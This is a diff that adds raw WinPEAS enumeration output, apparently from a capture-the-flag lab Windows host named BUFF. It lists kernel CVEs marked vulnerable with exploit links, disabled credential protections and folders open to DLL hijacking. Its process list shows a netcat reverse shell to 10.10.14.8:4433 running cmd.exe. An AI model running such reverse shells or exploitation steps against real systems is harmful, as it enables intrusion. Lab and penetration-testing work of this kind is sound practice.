@@ -1,0 +1,1746 @@
+ANSI color bit for Windows is not set. If you are execcuting this from a Windows terminal inside the host you should run 'REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1' and then start a new CMD
+[1;90m   Creating Dynamic lists, this could take a while, please wait...[0m
+[1;90m   - Checking if domain...[0m
+[1;90m   - Getting Win32_UserAccount info...[0m
+[1;90m   - Creating current user groups list...[0m
+[1;90m   - Creating active users list...[0m
+[1;90m   - Creating disabled users list...[0m
+[1;90m   - Admin users list...[0m
+[34m     
+             [1;32m*((,.,/((((((((((((((((((((/,  */               
+      [1;32m,/*,..*((((((((((((((((((((((((((((((((((,           
+    [1;32m,*/((((((((((((((((((/,  .*//((//**, .*(((((((*       
+    [1;32m(((((((((((((((([34m**********/[1;32m########## [1;32m.(* ,(((((((   
+    [1;32m(((((((((((/[34m********************/[1;32m####### [1;32m.(. (((((((
+    [1;32m((((((..[34m******************[0m/@@@@@/[34m***/[1;32m###### [1;32m./(((((((
+    [1;32m,,....[34m********************[0m@@@@@@@@@@[34m(***,[1;32m#### [1;32m.//((((((
+    [1;32m, ,..[34m********************[0m/@@@@@%@@@@[34m/********[1;32m##[1;32m((/ /((((
+    [1;32m..(([1;32m###########[34m*********[0m/%@@@@@@@@@[34m/************[1;32m,,..((((
+    [1;32m.([1;32m##################(/[34m******[0m/@@@@@[34m/***************[1;32m.. /((
+    [1;32m.([1;32m#########################(/[34m**********************[1;32m..*((
+    [1;32m.([1;32m##############################(/[34m*****************[1;32m.,(((
+    [1;32m.([1;32m###################################(/[34m************[1;32m..(((
+    [1;32m.([1;32m#######################################([34m*********[1;32m..(((
+    [1;32m.([1;32m#######(,.***.,(###################(..***.[34m*******[1;32m..(((
+    [1;32m.([1;32m#######*(#####((##################((######/([34m*****[1;32m..(((
+    [1;32m.([1;32m###################(/***********(##############([1;32m...(((
+    [1;32m.(([1;32m#####################/*******(################[1;32m.((((((
+    [1;32m.((([1;32m############################################[1;32m(..((((
+    [1;32m..((([1;32m##########################################[1;32m(..(((((
+    [1;32m....(([1;32m########################################[1;32m( .(((((
+    [1;32m......(([1;32m####################################[1;32m( .((((((
+    [1;32m((((((((([1;32m#################################[1;32m(../((((((
+        [1;32m(((((((((/[1;32m##########################[1;32m(/..((((((
+              [1;32m(((((((((/,.  ,*//////*,. ./(((((((((((((((.
+                 [1;32m(((((((((((((((((((((((((((((/[0m
+
+[1;33mADVISORY: [34mwinpeas should be used for authorized penetration testing and/or educational purposes only.Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner's permission.
+
+[33m  WinPEAS [1;32mvBETA VERSION, Please if you find any issue let me know in https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/issues[0m[33m by carlospolop[0m
+
+[33m  [+] [1;32mLeyend:[0m
+[1;31m         Red[1;37m                Indicates a special privilege over an object or something is misconfigured[0m
+[1;32m         Green[1;37m              Indicates that some protection is enabled or something is well configured[0m
+[36m         Cyan[1;37m               Indicates active users[0m
+[34m         Blue[1;37m               Indicates disabled users[0m
+[1;33m         LightYellow[1;37m        Indicates links[0m
+
+[33m   [?] [1;34mYou can find a Windows local PE Checklist here: [1;33mhttps://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation[0m
+
+
+[1;36m  ==========================================([0m[33mSystem Information[1;36m)==========================================[0m
+
+[33m  [+] [1;32mBasic System Information[33m([1;90mT1082&T1124&T1012&T1497&T1212[33m)[0m
+[33m   [?] [1;34mCheck if the Windows versions is vulnerable to some known exploit [1;33mhttps://book.hacktricks.xyz/windows/windows-local-privilege-escalation#kernel-exploits[0m
+[1;37m    Hostname: [0mBUFF
+[1;37m    ProductName: [0mWindows 10 Enterprise
+[1;37m    EditionID: [0mEnterprise
+[1;37m    ReleaseId: [0m1803
+[1;37m    BuildBranch: [0mrs4_release
+[1;37m    CurrentMajorVersionNumber: [0m10
+[1;37m    CurrentVersion: [0m6.3
+[1;37m    Architecture: [0mx86
+[1;37m    ProcessorCount: [0m4
+[1;37m    SystemLang: [0men-US
+[1;37m    KeyboardLang: [0mEnglish (United States)
+[1;37m    TimeZone: [0m(UTC+00:00) Dublin, Edinburgh, Lisbon, London
+[1;37m    IsVirtualMachine: [0m[0m[1;31mTrue[0m
+[1;37m    Current Time: [0m22/07/2020 18:31:04
+[1;37m    HighIntegrity: [0mFalse
+[1;37m    PartOfDomain: [0mFalse
+[1;37m    Hotfixes: [0m[1;32m[0m
+
+[33m  [?] [1;34mWindows vulns search powered by [1;31mWatson[1;34m(https://github.com/rasta-mouse/Watson)[0m
+    OS Build Number: 17134
+[1;31m       [!] CVE-2019-0836 : VULNERABLE[0m
+[1;31m        [>] https://exploit-db.com/exploits/46718[0m
+[1;31m        [>] https://decoder.cloud/2019/04/29/combinig-luafv-postluafvpostreadwrite-race-condition-pe-with-diaghub-collector-exploit-from-standard-user-to-system/[0m
+
+[1;31m       [!] CVE-2019-0841 : VULNERABLE[0m
+[1;31m        [>] https://github.com/rogue-kdc/CVE-2019-0841[0m
+[1;31m        [>] https://rastamouse.me/tags/cve-2019-0841/[0m
+
+[1;31m       [!] CVE-2019-1064 : VULNERABLE[0m
+[1;31m        [>] https://www.rythmstick.net/posts/cve-2019-1064/[0m
+
+[1;31m       [!] CVE-2019-1130 : VULNERABLE[0m
+[1;31m        [>] https://github.com/S3cur3Th1sSh1t/SharpByeBear[0m
+
+[1;31m       [!] CVE-2019-1253 : VULNERABLE[0m
+[1;31m        [>] https://github.com/padovah4ck/CVE-2019-1253[0m
+
+[1;31m       [!] CVE-2019-1315 : VULNERABLE[0m
+[1;31m        [>] https://offsec.almond.consulting/windows-error-reporting-arbitrary-file-move-eop.html[0m
+
+[1;31m       [!] CVE-2019-1385 : VULNERABLE[0m
+[1;31m        [>] https://www.youtube.com/watch?v=K6gHnr-VkAg[0m
+
+[1;31m       [!] CVE-2019-1388 : VULNERABLE[0m
+[1;31m        [>] https://github.com/jas502n/CVE-2019-1388[0m
+
+[1;31m       [!] CVE-2019-1405 : VULNERABLE[0m
+[1;31m        [>] https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/november/cve-2019-1405-and-cve-2019-1322-elevation-to-system-via-the-upnp-device-host-service-and-the-update-orchestrator-service/[0m
+
+[1;37m    Finished. Found [1;31m9[1;37m potential vulnerabilities.[0m
+
+[33m  [+] [1;32mPowerShell Settings[33m([1;90m[33m)[0m
+[1;37m    PowerShell v2 Version: [0m2.0
+[1;37m    PowerShell v5 Version: [0m5.1.17134.1
+[1;37m    Transcription Settings: [0m
+[1;37m    Module Logging Settings: [0m
+[1;37m    Scriptblock Logging Settings: [0m
+
+[33m  [+] [1;32mAudit Settings[33m([1;90mT1012[33m)[0m
+[33m   [?] [1;34mCheck what is being logged [1;33m[0m
+[1;90m    Not Found[0m
+
+[33m  [+] [1;32mWEF Settings[33m([1;90mT1012[33m)[0m
+[33m   [?] [1;34mWindows Event Forwarding, is interesting to know were are sent the logs [1;33m[0m
+[1;90m    Not Found[0m
+
+[33m  [+] [1;32mLAPS Settings[33m([1;90mT1012[33m)[0m
+[33m   [?] [1;34mIf installed, local administrator password is changed frequently and is restricted by ACL [1;33m[0m
+[1;37m    LAPS Enabled: [0m[0m[1;31mLAPS not installed[0m
+
+[33m  [+] [1;32mWdigest[33m([1;90m[33m)[0m
+[33m   [?] [1;34mIf enabled, plain-text crds could be stored in LSASS [1;33mhttps://book.hacktricks.xyz/windows/stealing-credentials/credentials-protections#wdigest[0m
+[1;32m    Wdigest is not enabled[0m
+
+[33m  [+] [1;32mLSA Protection[33m([1;90m[33m)[0m
+[33m   [?] [1;34mIf enabled, a driver is needed to read LSASS memory (If Secure Boot or UEFI, RunAsPPL cannot be disabled by deleting the registry key) [1;33mhttps://book.hacktricks.xyz/windows/stealing-credentials/credentials-protections#lsa-protection[0m
+[1;31m    LSA Protection is not enabled[0m
+
+[33m  [+] [1;32mCredentials Guard[33m([1;90m[33m)[0m
+[33m   [?] [1;34mIf enabled, a driver is needed to read LSASS memory [1;33mhttps://book.hacktricks.xyz/windows/stealing-credentials/credentials-protections#credential-guard[0m
+[1;31m    CredentialGuard is not enabled[0m
+
+[33m  [+] [1;32mCached Creds[33m([1;90m[33m)[0m
+[33m   [?] [1;34mIf > 0, credentials will be cached in the registry and accessible by SYSTEM user [1;33mhttps://book.hacktricks.xyz/windows/stealing-credentials/credentials-protections#cached-credentials[0m
+
+[33m  [+] [1;32mUser Environment Variables[33m([1;90m[33m)[0m
+[33m   [?] [1;34mCheck for some passwords or keys in the env variables [1;33m[0m
+[1;37m    Path: [0mC:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\shaun\AppData\Local\Microsoft\WindowsApps
+[1;37m    PATHEXT: [0m.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
+[1;37m    USERDOMAIN: [0mBUFF
+[1;37m    PROCESSOR_ARCHITECTURE: [0mx86
+[1;37m    ProgramW6432: [0mC:\Program Files
+[1;37m    DriverData: [0mC:\Windows\System32\Drivers\DriverData
+[1;37m    PUBLIC: [0mC:\Users\Public
+[1;37m    APPDATA: [0mC:\Users\shaun\AppData\Roaming
+[1;37m    windir: [0mC:\Windows
+[1;37m    LOCALAPPDATA: [0mC:\Users\shaun\AppData\Local
+[1;37m    CommonProgramW6432: [0mC:\Program Files\Common Files
+[1;37m    OneDrive: [0mC:\Users\shaun\OneDrive
+[1;37m    USERPROFILE: [0mC:\Users\shaun
+[1;37m    ProgramFiles: [0mC:\Program Files (x86)
+[1;37m    PROCESSOR_LEVEL: [0m23
+[1;37m    ProgramData: [0mC:\ProgramData
+[1;37m    COMPUTER[0m[1;31mNAME[0m: [0mBUFF
+[1;37m    PROCESSOR_ARCHITEW6432: [0mAMD64
+[1;37m    NUMBER_OF_PROCESSORS: [0m4
+[1;37m    PROCESSOR_IDENTIFIER: [0mAMD64 Family 23 Model 1 Stepping 2, AuthenticAMD
+[1;37m    PROMPT: [0m$P$G
+[1;37m    SystemRoot: [0mC:\Windows
+[1;37m    ComSpec: [0mC:\Windows\system32\cmd.exe
+[1;37m    TEMP: [0mC:\Users\shaun\AppData\Local\Temp
+[1;37m    ProgramFiles(x86): [0mC:\Program Files (x86)
+[1;37m    AP_PARENT_PID: [0m8300
+[1;37m    CommonProgramFiles: [0mC:\Program Files (x86)\Common Files
+[1;37m    TMP: [0mC:\Users\shaun\AppData\Local\Temp
+[1;37m    PROCESSOR_REVISION: [0m0102
+[1;37m    CommonProgramFiles(x86): [0mC:\Program Files (x86)\Common Files
+[1;37m    ALLUSERSPROFILE: [0mC:\ProgramData
+[1;37m    SystemDrive: [0mC:
+[1;37m    PSModulePath: [0m%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+[1;37m    OS: [0mWindows_NT
+[1;37m    USER[0m[1;31mNAME[0m: [0mshaun
+
+[33m  [+] [1;32mSystem Environment Variables[33m([1;90m[33m)[0m
+[33m   [?] [1;34mCheck for some passwords or keys in the env variables [1;33m[0m
+[1;37m    ComSpec: [0mC:\Windows\system32\cmd.exe
+[1;37m    DriverData: [0mC:\Windows\System32\Drivers\DriverData
+[1;37m    OS: [0mWindows_NT
+[1;37m    Path: [0mC:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\
+[1;37m    PATHEXT: [0m.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
+[1;37m    PROCESSOR_ARCHITECTURE: [0mAMD64
+[1;37m    PSModulePath: [0mC:\Program Files (x86)\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+[1;37m    TEMP: [0mC:\Windows\TEMP
+[1;37m    TMP: [0mC:\Windows\TEMP
+[1;37m    USER[0m[1;31mNAME[0m: [0mSYSTEM
+[1;37m    windir: [0mC:\Windows
+[1;37m    NUMBER_OF_PROCESSORS: [0m4
+[1;37m    PROCESSOR_LEVEL: [0m23
+[1;37m    PROCESSOR_IDENTIFIER: [0mAMD64 Family 23 Model 1 Stepping 2, AuthenticAMD
+[1;37m    PROCESSOR_REVISION: [0m0102
+
+[33m  [+] [1;32mHKCU Internet Settings[33m([1;90mT1012[33m)[0m
+[1;37m    User Agent: [0mMozilla/4.0 (compatible; MSIE 8.0; Win32)
+[1;37m    IE5_UA_Backup_Flag: [0m5.0
+[1;37m    ZonesSecurityUpgrade: [0mSystem.Byte[]
+[1;37m    EnableNegotiate: [0m1
+[1;37m    ProxyEnable: [0m0
+
+[33m  [+] [1;32mHKLM Internet Settings[33m([1;90mT1012[33m)[0m
+[1;37m    ActiveXCache: [0mC:\Windows\Downloaded Program Files
+[1;37m    CodeBaseSearchPath: [0mCODEBASE
+[1;37m    EnablePunycode: [0m1
+[1;37m    MinorVersion: [0m0
+[1;37m    WarnOnIntranet: [0m1
+
+[33m  [+] [1;32mDrives Information[33m([1;90mT1120[33m)[0m
+[33m   [?] [1;34mRemember that you should search more info inside the other drives [1;33m[0m
+    C:\ (Type: Fixed)(Filesystem: NTFS)(Available space: 8 GB)([0m[1;31mPermissions: Authenticated Users [AppendData/CreateDirectories])[0m
+
+[33m  [+] [1;32mAV Information[33m([1;90mT1063[33m)[0m
+[1;90m  [X] Exception: Object reference not set to an instance of an object.[0m
+[1;31m    No AV was detected!![0m
+[1;90m    Not Found[0m
+
+[33m  [+] [1;32mUAC Status[33m([1;90mT1012[33m)[0m
+[33m   [?] [1;34mIf you are in the Administrators group check how to bypass the UAC [1;33mhttps://book.hacktricks.xyz/windows/windows-local-privilege-escalation#basic-uac-bypass-full-file-system-access[0m
+[1;37m    ConsentPromptBehaviorAdmin: [0m5 - [0m[1;31mPromptForNonWindowsBinaries[0m
+[1;37m    EnableLUA: [0m1
+[1;37m    LocalAccountTokenFilterPolicy: [0m
+[1;37m    FilterAdministratorToken: [0m
+[1;32m      [*] LocalAccountTokenFilterPolicy set to 0 and FilterAdministratorToken != 1.
+      [-] Only the RID-500 local admin account can be used for lateral movement.[0m
+
+
+[1;36m  ===========================================([0m[33mUsers Information[1;36m)===========================================[0m
+
+[33m  [+] [1;32mUsers[33m([1;90mT1087&T1069&T1033[33m)[0m
+[33m   [?] [1;34mCheck if you have some admin equivalent privileges [1;33mhttps://book.hacktricks.xyz/windows/windows-local-privilege-escalation#users-and-groups[0m
+  Current user: [0m[36m[0m[1:35mshaun[0m[0m
+  Current groups: Domain Users, Everyone, Users, Batch, Console Logon, Authenticated Users, This Organization, Local account, Local, NTLM Authentication
+[1;90m   =================================================================================================[0m
+
+    [0m[1:35mBUFF[0m\[0m[1;31mAdministrator[0m: Built-in account for administering the computer/domain
+        |->Groups: [0m[1;31mAdministrator[0ms
+        |->Password: CanChange-[0m[1;31mNotExpi[0m-Req
+
+    [0m[1:35mBUFF[0m\[0m[34mDefaultAccount[0m([0m[34mDisabled[0m): A user account managed by the system.
+        |->Groups: System Managed Accounts Group
+        |->Password: CanChange-[0m[1;31mNotExpi[0m-NotReq
+
+    [0m[1:35mBUFF[0m\[0m[34mGuest[0m([0m[34mDisabled[0m): Built-in account for guest access to the computer/domain
+        |->Groups: [0m[34mGuest[0ms
+        |->Password: [0m[1;31mNotChange[0m-[0m[1;31mNotExpi[0m-NotReq
+
+    [0m[1:35mBUFF[0m\[0m[36m[0m[1:35mshaun[0m[0m
+        |->Groups: Users
+        |->Password: [0m[1;31mNotChange[0m-[0m[1;31mNotExpi[0m-NotReq
+
+    [0m[1:35mBUFF[0m\[0m[34mWDAGUtilityAccount[0m([0m[34mDisabled[0m): A user account managed and used by the system for Windows Defender Application Guard scenarios.
+        |->Password: CanChange-Expi-Req
+
+
+[33m  [+] [1;32mCurrent Token privileges[33m([1;90mT1134[33m)[0m
+[33m   [?] [1;34mCheck if you can escalate privilege using some enabled token [1;33mhttps://book.hacktricks.xyz/windows/windows-local-privilege-escalation#token-manipulation[0m
+[1;37m    SeShutdownPrivilege: [0mDISABLED
+[1;37m    SeChangeNotifyPrivilege: [0mSE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
+[1;37m    SeUndockPrivilege: [0mDISABLED
+[1;37m    SeIncreaseWorkingSetPrivilege: [0mDISABLED
+[1;37m    SeTimeZonePrivilege: [0mDISABLED
+
+[33m  [+] [1;32mClipboard text[33m([1;90mT1134[33m)[0m
+[1;31m[0m
+
+[33m  [+] [1;32mLogged users[33m([1;90mT1087&T1033[33m)[0m
+    [0m[1:35mBUFF[0m\[0m[1;31mAdministrator[0m
+
+[33m  [+] [1;32mRDP Sessions[33m([1;90mT1087&T1033[33m)[0m
+[1;90m    Not Found[0m
+
+[33m  [+] [1;32mEver logged users[33m([1;90mT1087&T1033[33m)[0m
+[1;90m  [X] Exception: System.Security.Principal.IdentityNotMappedException: Some or all identity references could not be translated.
+   at System.Security.Principal.SecurityIdentifier.Translate(IdentityReferenceCollection sourceSids, Type targetType, Boolean forceSuccess)
+   at System.Security.Principal.SecurityIdentifier.Translate(Type targetType)
+   at winPEAS.UserInfo.GetEverLoggedUsers()[0m
+    [0m[1:35mBUFF[0m\[0m[1;31mAdministrator[0m
+
+[33m  [+] [1;32mLooking for AutoLogon credentials[33m([1;90mT1012[33m)[0m
+[1;90m    Not Found[0m
+
+[33m  [+] [1;32mHome folders found[33m([1;90mT1087&T1083&T1033[33m)[0m
+[1;32m    C:\Users\Administrator[0m
+[1;32m    C:\Users\All Users[0m
+[1;32m    C:\Users\Default[0m
+[1;32m    C:\Users\Default User[0m
+[1;31m    C:\Users\Public : Batch [WriteData/CreateFiles][0m
+[1;32m    C:\Users\shaun[0m
+
+[33m  [+] [1;32mPassword Policies[33m([1;90mT1201[33m)[0m
+[33m   [?] [1;34mCheck for a possible brute-force [1;33m[0m
+[1;37m    Domain: [0mBuiltin
+[1;37m    SID: [0mS-1-5-32
+[1;37m    MaxPasswordAge: [0m42.22:47:31.7437440
+[1;37m    MinPasswordAge: [0m00:00:00
+[1;37m    MinPasswordLength: [0m0
+[1;37m    PasswordHistoryLength: [0m0
+[1;37m    PasswordProperties: [0m0
+[1;90m   =================================================================================================[0m
+
+[1;37m    Domain: [0m[0m[1:35mBUFF[0m
+[1;37m    SID: [0mS-1-5-21-2277156429-3381729605-2640630771
+[1;37m    MaxPasswordAge: [0m42.00:00:00
+[1;37m    MinPasswordAge: [0m00:00:00
+[1;37m    MinPasswordLength: [0m0
+[1;37m    PasswordHistoryLength: [0m0
+[1;37m    PasswordProperties: [0m0
+[1;90m   =================================================================================================[0m
+
+
+
+[1;36m  =======================================([0m[33mProcesses Information[1;36m)=======================================[0m
+
+[33m  [+] [1;32mInteresting Processes -non Microsoft-[33m([1;90mT1010&T1057&T1007[33m)[0m
+[33m   [?] [1;34mCheck if any interesting proccesses for memmory dump or if you could overwrite some binary running [1;33mhttps://book.hacktricks.xyz/windows/windows-local-privilege-escalation#running-processes[0m
+    conhost(972)[[0m[1;32mC:\Windows\system32\conhost.exe][0m -- POwn:[0m[1:35m shaun[0m
+    [1;37mCommand Line: \??\[0m[1;32mC:\Windows\system32\conhost.exe [0m0x4
+[1;90m   =================================================================================================[0m
+
+    httpd(9112)[[0m[1;31mC:\xampp\apache\bin\httpd.exe][0m -- POwn:[0m[1:35m shaun[0m
+    [0m[1;31mPermissions: Authenticated Users [WriteData/CreateFiles][0m
+    [0m[1;31mPossible DLL Hijacking folder: C:\xampp\apache\bin (Authenticated Users [WriteData/CreateFiles])[0m
+    [1;37mCommand Line: [0m[1;31mC:\xampp\apache\bin\httpd.exe [0m-d C:/xampp/apache -f conf\httpd.conf
+[1;90m   =================================================================================================[0m
+
+    mysqld(8328)[[0m[1;31mC:\xampp\mysql\bin\mysqld.exe][0m -- POwn:[0m[1:35m shaun[0m
+    [0m[1;31mPermissions: Authenticated Users [WriteData/CreateFiles][0m
+    [0m[1;31mPossible DLL Hijacking folder: C:\xampp\mysql\bin (Authenticated Users [WriteData/CreateFiles])[0m
+    [1;37mCommand Line: mysql\bin\mysqld.exe --defaults-file=mysql\bin\my.ini --standalone
+[1;90m   =================================================================================================[0m
+
+    conhost(5556)[[0m[1;32mC:\Windows\system32\conhost.exe][0m -- POwn:[0m[1:35m shaun[0m
+    [1;37mCommand Line: \??\[0m[1;32mC:\Windows\system32\conhost.exe [0m0x4
+[1;90m   =================================================================================================[0m
+
+    cmd(2068)[[0m[1;32mC:\Windows\SYSTEM32\cmd.exe][0m -- POwn:[0m[1:35m shaun[0m
+    [1;37mCommand Line: cmd.exe /c "C:\Users\shaun\Desktop\poc.ps1"
+[1;90m   =================================================================================================[0m
+
+    winpeas(6772)[[0m[1;32mC:\Users\shaun\Desktop\winpeas.exe][0m -- POwn:[0m[1:35m shaun[0m -- isDotNet
+    [1;37mCommand Line: .\winpeas.exe  
+[1;90m   =================================================================================================[0m
+
+    conhost(7948)[[0m[1;32mC:\Windows\system32\conhost.exe][0m -- POwn:[0m[1:35m shaun[0m
+    [1;37mCommand Line: \??\[0m[1;32mC:\Windows\system32\conhost.exe [0m0x4
+[1;90m   =================================================================================================[0m
+
+    httpd(8300)[[0m[1;31mC:\xampp\apache\bin\httpd.exe][0m -- POwn:[0m[1:35m shaun[0m
+    [0m[1;31mPermissions: Authenticated Users [WriteData/CreateFiles][0m
+    [0m[1;31mPossible DLL Hijacking folder: C:\xampp\apache\bin (Authenticated Users [WriteData/CreateFiles])[0m
+    [1;37mCommand Line: apache\bin\httpd.exe -f conf\httpd.conf
+[1;90m   =================================================================================================[0m
+
+    notepad(3340)[[0m[1;32mC:\Windows\System32\notepad.exe][0m -- POwn:[0m[1:35m shaun[0m
+    [1;37mCommand Line: "C:\Windows\System32\notepad.exe" "C:\Users\shaun\Desktop\poc.ps1"
+[1;90m   =================================================================================================[0m
+
+    nc(3844)[[0m[1;32mC:\Users\shaun\Desktop\nc.exe][0m -- POwn:[0m[1:35m shaun[0m
+    [1;37mCommand Line: [0m[1;32mC:\Users\shaun\Desktop\nc.exe [0m 10.10.14.8 4433 -e cmd.exe
+[1;90m   =================================================================================================[0m
+
+    cmd(6492)[[0m[1;32mC:\Windows\SysWOW64\cmd.exe][0m -- POwn:[0m[1:35m shaun[0m
+    [1;37mCommand Line: cmd.exe
+[1;90m   =================================================================================================[0m
+
+    cmd(5320)[[0m[1;32mC:\Windows\SYSTEM32\cmd.exe][0m -- POwn:[0m[1:35m shaun[0m
+    [1;37mCommand Line: cmd.exe /c "C:\Users\shaun\Desktop\nc.exe 10.10.14.8 4433 -e cmd.exe"
+[1;90m   =================================================================================================[0m
+
+[1;90mSystem.InvalidOperationException: Cannot open Service Control Manager on computer '.'. This operation might require other privileges. ---> System.ComponentModel.Win32Exception: Access is denied
+   --- End of inner exception stack trace ---
+   at System.ServiceProcess.ServiceController.GetDataBaseHandleWithAccess(String machineName, Int32 serviceControlManaqerAccess)
+   at System.ServiceProcess.ServiceController.GetDataBaseHandleWithEnumerateAccess(String machineName)
+   at System.ServiceProcess.ServiceController.GetServicesOfType(String machineName, Int32 serviceType)
+   at System.ServiceProcess.ServiceController.GetServices()
+   at winPEAS.ServicesInfo.GetModifiableServices(Dictionary`2 SIDs)
+   at winPEAS.Program.PrintInfoServices()[0m
+
+
+[1;36m  ========================================([0m[33mServices Information[1;36m)========================================[0m
+
+[33m  [+] [1;32mInteresting Services -non Microsoft-[33m([1;90mT1007[33m)[0m
+[33m   [?] [1;34mCheck if you can overwrite some service binary or perform a DLL hijacking, also check for unquoted paths [1;33mhttps://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services[0m
+[1;90m  [X] Exception: Access denied [0m
+    @1394.inf,%PCI\CC_0C0010.DeviceDesc%;1394 OHCI Compliant Host Controller(@1394.inf,%PCI\CC_0C0010.DeviceDesc%;1394 OHCI Compliant Host Controller)[[0m[1;32mC:\Windows\System32\drivers\1394ohci.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @acpi.inf,%ACPI.SvcDesc%;Microsoft ACPI Driver(@acpi.inf,%ACPI.SvcDesc%;Microsoft ACPI Driver)[[0m[1;32mSystem32\drivers\ACPI.sys[0m] - Boot
+[1;90m   =================================================================================================[0m
+
+    @acpidev.inf,%AcpiDev.SvcDesc%;ACPI Devices driver(@acpidev.inf,%AcpiDev.SvcDesc%;ACPI Devices driver)[[0m[1;32mC:\Windows\System32\drivers\AcpiDev.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    Microsoft ACPIEx Driver(Microsoft ACPIEx Driver)[[0m[1;32mSystem32\Drivers\acpiex.sys[0m] - Boot
+[1;90m   =================================================================================================[0m
+
+    @acpipagr.inf,%SvcDesc%;ACPI Processor Aggregator Driver(@acpipagr.inf,%SvcDesc%;ACPI Processor Aggregator Driver)[[0m[1;32mC:\Windows\System32\drivers\acpipagr.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @acpipmi.inf,%AcpiPmi.SvcDesc%;ACPI Power Meter Driver(@acpipmi.inf,%AcpiPmi.SvcDesc%;ACPI Power Meter Driver)[[0m[1;32mC:\Windows\System32\drivers\acpipmi.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @acpitime.inf,%AcpiTime.SvcDesc%;ACPI Wake Alarm Driver(@acpitime.inf,%AcpiTime.SvcDesc%;ACPI Wake Alarm Driver)[[0m[1;32mC:\Windows\System32\drivers\acpitime.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @%systemroot%\system32\drivers\afd.sys,-1000(@%systemroot%\system32\drivers\afd.sys,-1000)[[0m[1;32mC:\Windows\system32\drivers\afd.sys[0m] - System
+    [1;37m@%systemroot%\system32\drivers\afd.sys,-1000
+[1;90m   =================================================================================================[0m
+
+    @%systemroot%\system32\drivers\ahcache.sys,-102(@%systemroot%\system32\drivers\ahcache.sys,-102)[[0m[1;32msystem32\DRIVERS\ahcache.sys[0m] - System
+    [1;37m@%systemroot%\system32\drivers\ahcache.sys,-101
+[1;90m   =================================================================================================[0m
+
+    @%SystemRoot%\system32\Alg.exe,-112(@%SystemRoot%\system32\Alg.exe,-112)[[0m[1;32mC:\Windows\System32\alg.exe[0m] - System
+    [1;37m@%SystemRoot%\system32\Alg.exe,-113
+[1;90m   =================================================================================================[0m
+
+    @cpu.inf,%AmdK8.SvcDesc%;AMD K8 Processor Driver(@cpu.inf,%AmdK8.SvcDesc%;AMD K8 Processor Driver)[[0m[1;32mC:\Windows\System32\drivers\amdk8.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @cpu.inf,%AmdPPM.SvcDesc%;AMD Processor Driver(@cpu.inf,%AmdPPM.SvcDesc%;AMD Processor Driver)[[0m[1;32mC:\Windows\System32\drivers\amdppm.sys[0m] - System
+[1;90m   =================================================================================================[0m
+
+    @%systemroot%\system32\srpapi.dll,-100(@%systemroot%\system32\srpapi.dll,-100)[[0m[1;32msystem32\drivers\appid.sys[0m] - System
+    [1;37m@%systemroot%\system32\srpapi.dll,-101
+[1;90m   =================================================================================================[0m
+
+    @%systemroot%\system32\srpapi.dll,-102(@%systemroot%\system32\srpapi.dll,-102)[[0m[1;32msystem32\drivers\applockerfltr.sys[0m] - System
+    [1;37m@%systemroot%\system32\srpapi.dll,-103
+[1;90m   =================================================================================================[0m
+
+    @%systemroot%\system32\AppVClient.exe,-102(@%systemroot%\system32\AppVClient.exe,-102)[[0m[1;32mC:\Windows\system32\AppVClient.exe[0m] - Manual
+    [1;37m@%systemroot%\system32\AppVClient.exe,-101
+[1;90m   =================================================================================================[0m
+
+    @%systemroot%\system32\drivers\AppvStrm.sys,-101(@%systemroot%\system32\drivers\AppvStrm.sys,-101)[[0m[1;32mC:\Windows\system32\drivers\AppvStrm.sys[0m] - System
+    [1;37m@%systemroot%\system32\drivers\AppvStrm.sys,-102
+[1;90m   =================================================================================================[0m
+
+    @%systemroot%\system32\drivers\AppvVemgr.sys,-101(@%systemroot%\system32\drivers\AppvVemgr.sys,-101)[[0m[1;32mC:\Windows\system32\drivers\AppvVemgr.sys[0m] - System
+    [1;37m@%systemroot%\system32\drivers\AppvVemgr.sys,-102
+[1;90m   =================================================================================================[0m
+
+    @%systemroot%\system32\drivers\AppvVfs.sys,-101(@%systemroot%\system32\drivers\AppvVfs.sys,-101)[[0m[1;32mC:\Windows\system32\drivers\AppvVfs.sys[0m] - System
+    [1;37m@%systemroot%\system32\drivers\AppvVfs.sys,-102
+[1;90m   =================================================================================================[0m
+
+    @arcsas.inf,%arcsas_ServiceName%;Adaptec SAS/SATA-II RAID Storport's Miniport Driver(@arcsas.inf,%arcsas_ServiceName%;Adaptec SAS/SATA-II RAID Storport's Miniport Driver)[[0m[1;32mSystem32\drivers\arcsas.sys[0m] - Boot
+[1;90m   =================================================================================================[0m
+
+    @%systemroot%\system32\mprmsg.dll,-32000(@%systemroot%\system32\mprmsg.dll,-32000)[[0m[1;32mC:\Windows\System32\drivers\asyncmac.sys[0m] - System
+    [1;37m@%systemroot%\system32\mprmsg.dll,-32000
+[1;90m   =================================================================================================[0m
+
+    @mshdc.inf,%idechannel.DeviceDesc%;IDE Channel(@mshdc.inf,%idechannel.DeviceDesc%;IDE Channel)[[0m[1;32mSystem32\drivers\atapi.sys[0m] - Boot
+[1;90m   =================================================================================================[0m
+
+    @netbvbda.inf,%vbd_srv_desc%;QLogic Network Adapter VBD(@netbvbda.inf,%vbd_srv_desc%;QLogic Network Adapter VBD)[[0m[1;32mSystem32\drivers\bxvbda.sys[0m] - Boot
+[1;90m   =================================================================================================[0m
+
